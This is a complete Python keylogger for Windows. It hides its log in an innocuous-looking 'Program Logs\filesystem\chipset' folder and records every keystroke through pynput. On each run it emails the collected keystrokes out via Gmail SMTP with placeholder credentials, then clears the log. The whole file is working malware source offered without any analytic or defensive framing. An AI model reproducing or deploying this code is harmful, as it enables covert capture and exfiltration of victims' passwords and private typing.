
import os
import smtplib
from datetime import datetime as dt
from pynput.keyboard import Listener

if not os.path.exists("C:\\Program Logs\\filesystem"):
    os.chdir("C:\\")
    os.makedirs('Program Logs')
    os.chdir('Program Logs')
    os.makedirs("filesystem")
    os.chdir('filesystem')
    os.makedirs('chipset')
    os.chdir('chipset')
    os.makedirs('LOGS')
    os.chdir('LOGS')
    f9 = open('C:\\Program Logs\\filesystem\\chipset\\LOGS\\data.mes', 'w')

if os.path.exists("C:\\Program Logs\\filesystem"):


    f2 = open('C:\\Program Logs\\filesystem\\chipset\\LOGS\\data.mes', 'r')   # Reads the previous stored content and sends it via email
    msg = f2.read()
    f2.close()

    mail = smtplib.SMTP('smtp.gmail.com', 587)

    mail.ehlo()
    mail.starttls()

    mail.login('<<your email>>', '<<your password>>')

    mail.sendmail('<<your email>>', '<<your email>>', msg)








    f5 = open('C:\\Program Logs\\filesystem\\chipset\\LOGS\\data.mes', 'w')   # Deletes the previous stored content
    now = dt.now()
    f5.write(str(now.date()) + '\n \n \n ')
    f5.close()


def on_press(key):
    f = open('C:\\Program Logs\\filesystem\\chipset\\LOGS\\data.mes', 'a')

    f.write(str(key) + '\n')
    f.close()


def on_release(key):
    pass


# f = open('C:\\filesystem\\LOGS\\logs3.txt', 'a')
# f.write(str(key)+'\n')
# f.close()

#   if key==Key.esc:
#       return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
